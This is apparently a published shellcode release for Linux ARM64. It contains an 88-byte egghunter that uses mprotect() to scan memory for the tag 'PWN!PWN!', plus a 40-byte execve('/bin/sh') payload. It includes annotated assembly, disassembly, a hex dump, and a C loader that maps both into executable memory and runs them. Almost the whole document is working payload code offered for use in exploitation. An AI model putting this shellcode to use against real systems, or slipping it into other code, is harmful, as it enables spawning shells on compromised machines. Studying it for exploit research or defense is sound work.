/*
# Title:  Linux/ARM64 - Egghunter (PWN!PWN!) + execve("/bin/sh", NULL, NULL) + mprotect() Shellcode (88 Bytes)
# Date:   2019-06-30
# Tested: Ubuntu 16.04 (aarch64)
# Author: Ken Kitahara
# Compilation: gcc -o loader loader.c


ubuntu@ubuntu:~/works$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu Xenial Xerus (development branch)
Release:	16.04
Codename:	xenial
ubuntu@ubuntu:~/works$ uname -a
Linux ubuntu 4.2.0-16-generic #19-Ubuntu SMP Thu Oct 8 15:00:45 UTC 2015 aarch64 aarch64 aarch64 GNU/Linux
ubuntu@ubuntu:~/works$ cat egghunter.s
.section .text
.global _start

_start:
    mov  x8, #226               // Systemcall Number = x8 = 226 (mprotect)
    lsr  x2, x8, #5             // args[2] = x2 = 7 = PROT_READ|PROT_WRITE|PROT_EXEC
    add  x1, x2, #0xff9         // args[1] = x1 = 0x1000
    mov  x10, xzr               // Start address of scannning = x10 = 0x0000000000000000
    mov  x11, #0x5750           // Eggtag = x11 = 0x0000000000005750
    movk x11, #0x214E, lsl #16  // Eggtag = x11 = 0x00000000214E5750
    add  x11, x11, x11, lsl #32 // Eggtag = x11 = 0x214E5750214E5750 = "!NWP!NWP"
jump_search_page:
    tbz  x8, #63, search_page   // In this code, the top bit of x8 register is always zero. Jump to address of search_page

jump_shellcode:
    br   x10                    // Jump to shellcode

hunt:
    add  x13, x10, x1           // End address of current page = x13
next_address:
    ldr  x12, [x10], #8         // Load value from the address pointed by x10 to x12 and add 8 to x10
    cmp  x11, x12               // Compare loaded value and eggtag.
    beq  jump_shellcode         // If loaded value matched to eggtag, jump to the address of jump_shellcode part.
    cmp  x10, x13               // Check if current searching address (x10) over end address of current page (x13).
    bge  jump_search_page       // If x10 was over x13, search next valid page.
    sub  x10, x10, x2           // x10 = x10 - 7. This instruction is for search memory address 1 byte by 1 byte.
    b    next_address           // Check next memory address.

search_page:
    // mprotect(*buf, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC)
    add  x0, x10, xzr           // args[0] = x0 = x10 + xzr = x10
    svc  #0x1337                // Invoke mprotect().
    tbz  x0, #63, hunt          // If return value is positive, jump to hunt label location.
    add  x10, x10, x1           // Next page address = x10 + x1 = x10 + 0x1000
    b    search_page            // Check next page address.
ubuntu@ubuntu:~/works$ as -o egghunter.o egghunter.s && ld -o egghunter egghunter.o
ubuntu@ubuntu:~/works$ objdump -d ./egghunter

./egghunter:     file format elf64-littleaarch64


Disassembly of section .text:

0000000000400078 <_start>:
  400078:	d2801c48 	mov	x8, #0xe2                  	// #226
  40007c:	d345fd02 	lsr	x2, x8, #5
  400080:	913fe441 	add	x1, x2, #0xff9
  400084:	aa1f03ea 	mov	x10, xzr
  400088:	d28aea0b 	mov	x11, #0x5750                	// #22352
  40008c:	f2a429cb 	movk	x11, #0x214e, lsl #16
  400090:	8b0b816b 	add	x11, x11, x11, lsl #32

0000000000400094 <jump_search_page>:
  400094:	b6f80148 	tbz	x8, #63, 4000bc <search_page>

0000000000400098 <jump_shellcode>:
  400098:	d61f0140 	br	x10

000000000040009c <hunt>:
  40009c:	8b01014d 	add	x13, x10, x1

00000000004000a0 <next_address>:
  4000a0:	f840854c 	ldr	x12, [x10],#8
  4000a4:	eb0c017f 	cmp	x11, x12
  4000a8:	54ffff80 	b.eq	400098 <jump_shellcode>
  4000ac:	eb0d015f 	cmp	x10, x13
  4000b0:	54ffff2a 	b.ge	400094 <jump_search_page>
  4000b4:	cb02014a 	sub	x10, x10, x2
  4000b8:	17fffffa 	b	4000a0 <next_address>

00000000004000bc <search_page>:
  4000bc:	8b1f0140 	add	x0, x10, xzr
  4000c0:	d40266e1 	svc	#0x1337
  4000c4:	b6fffec0 	tbz	x0, #63, 40009c <hunt>
  4000c8:	8b01014a 	add	x10, x10, x1
  4000cc:	17fffffc 	b	4000bc <search_page>
ubuntu@ubuntu:~/works$ objcopy -O binary egghunter egghunter.bin
ubuntu@ubuntu:~/works$ hexdump -v -e '"\\""x" 1/1 "%02x" ""' egghunter.bin && echo
\x48\x1c\x80\xd2\x02\xfd\x45\xd3\x41\xe4\x3f\x91\xea\x03\x1f\xaa\x0b\xea\x8a\xd2\xcb\x29\xa4\xf2\x6b\x81\x0b\x8b\x48\x01\xf8\xb6\x40\x01\x1f\xd6\x4d\x01\x01\x8b\x4c\x85\x40\xf8\x7f\x01\x0c\xeb\x80\xff\xff\x54\x5f\x01\x0d\xeb\x2a\xff\xff\x54\x4a\x01\x02\xcb\xfa\xff\xff\x17\x40\x01\x1f\x8b\xe1\x66\x02\xd4\xc0\xfe\xff\xb6\x4a\x01\x01\x8b\xfc\xff\xff\x17

*/

#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char stager[] =
"\x48\x1c\x80\xd2\x02\xfd\x45\xd3\x41\xe4\x3f\x91\xea\x03\x1f\xaa"
"\x0b\xea\x8a\xd2\xcb\x29\xa4\xf2\x6b\x81\x0b\x8b\x48\x01\xf8\xb6"
"\x40\x01\x1f\xd6\x4d\x01\x01\x8b\x4c\x85\x40\xf8\x7f\x01\x0c\xeb"
"\x80\xff\xff\x54\x5f\x01\x0d\xeb\x2a\xff\xff\x54\x4a\x01\x02\xcb"
"\xfa\xff\xff\x17\x40\x01\x1f\x8b\xe1\x66\x02\xd4\xc0\xfe\xff\xb6"
"\x4a\x01\x01\x8b\xfc\xff\xff\x17";

// Linux/ARM64 - execve("/bin/sh", NULL, NULL) Shellcode (40 Bytes)
char shell[] =
"PWN!PWN!"
"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2"
"\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b"
"\xa8\x1b\x80\xd2\xe1\x66\x02\xd4";

int main(int argc, char **argv) {
    printf("Shellcode Length: %zd Bytes\n", strlen(stager));

    void *ptr1 = mmap(0, 0x100, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);

    if (ptr1 == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }

    void *ptr2 = mmap(0, 0x100, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);

    if (ptr2 == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }

    memcpy(ptr1, stager, sizeof(stager));
    memcpy(ptr2, shell, sizeof(shell));
    sc = ptr1;

    sc();

    return 0;
}